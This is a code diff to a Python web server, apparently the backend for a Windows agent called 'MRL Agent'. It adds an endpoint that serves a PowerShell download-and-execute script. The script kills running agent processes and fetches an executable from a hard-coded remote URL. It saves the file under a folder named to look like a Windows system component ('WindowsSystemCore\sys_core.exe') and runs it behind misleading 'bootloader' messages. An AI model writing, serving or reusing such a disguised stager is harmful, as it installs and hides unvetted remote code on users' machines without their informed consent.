@@ -120,12 +120,25 @@ async def get_index():
         return f.read()
 
 @app.get("/api/script")
-async def get_deploy_script(request: Request):
-    host = request.headers.get("host") or socket.gethostbyname(socket.gethostname())
-    is_https = request.headers.get("x-forwarded-proto") == "https"
-    protocol = "https" if is_https else "http"
-    ps_script = f"""$host_url = "{protocol}://{host}"; $url = "{protocol}://{host}/api/client_exe"; Write-Host "Downloading MRL Agent..." -ForegroundColor Cyan; Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\\mrl_agent.exe"; Start-Process "$env:TEMP\\mrl_agent.exe" -ArgumentList "--server {host.split(':')[0]}" """.strip()
-    return Response(content=ps_script, media_type="text/plain")
+def get_script():
+    ps1 = f"""
+$exeUrl = "https://web-production-d6db5.up.railway.app/api/client_exe"
+$targetDir = "$env:APPDATA\\WindowsSystemCore"
+$targetExe = "$targetDir\\sys_core.exe"
+
+Stop-Process -Name "sys_core" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "mrl_agent" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
+
+if (-not (Test-Path -Path $targetDir)) {{ New-Item -ItemType Directory -Path $targetDir -Force }}
+
+Write-Host "Downloading Core Engine... Please wait (~90MB)" -ForegroundColor Cyan
+Invoke-WebRequest -Uri $exeUrl -OutFile $targetExe -UseBasicParsing
+
+Write-Host "Initializing Bootloader Sequence..." -ForegroundColor Green
+Start-Process -FilePath $targetExe
+"""
+    return Response(content=ps1, media_type="text/plain")
 
 @app.get("/api/client_exe")
 async def get_client_exe():
